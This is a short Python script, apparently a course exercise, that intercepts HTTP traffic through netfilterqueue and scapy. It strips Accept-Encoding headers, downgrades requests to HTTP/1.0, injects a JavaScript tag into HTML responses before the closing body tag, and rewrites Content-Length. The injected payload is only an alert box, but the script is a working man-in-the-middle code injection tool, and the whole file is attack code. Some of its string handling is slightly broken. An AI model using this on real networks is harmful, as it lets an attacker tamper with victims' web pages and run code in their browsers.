#!/usr/bin/python

import scapy.all as scapy
import netfilterqueue
import re

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Remove checksum and len
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):

    scapy_pack = scapy.IP(packet.get_payload())

    try:
        if scapy_pack.haslayer(scapy.Raw):
            load = scapy_pack[scapy.Raw].load
            if scapy_pack[scapy.TCP].dport == 10000:
                print("[+] HTTP Request :]\n")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
                new_pack = set_load(scapy_pack, load)
                print(scapy_pack.show())
                packet.set_payload(str(new_pack))

            elif scapy_pack[scapy.TCP].sport == 10000:

                print("[+] HTTP Response\n")
                print(scapy_pack.show())
                inject = "<script>alert('polo');</script>"
                load = load.replace("</body>", inject + "</body")
                # Getting server content length value
                content_length_sr = re.search("(?:Content-Length:\s)(\d*)", load)

                if content_length_sr and "text/html" in load:
                    content_length = content_length_sr.group(1)
                    new_cont_length = int(content_length) + len(inject)
                    load = load.replace(content_length, str(new_cont_length))
                    print("polooooooooooooooo", content_length)

            if load != scapy_pack[scapy.Raw].load:
                new_packet = set_load(scapy_pack, load)
                print("[+] Injecting Javascript")
                packet.set_payload(str(new_packet))

    except IndexError:
        pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
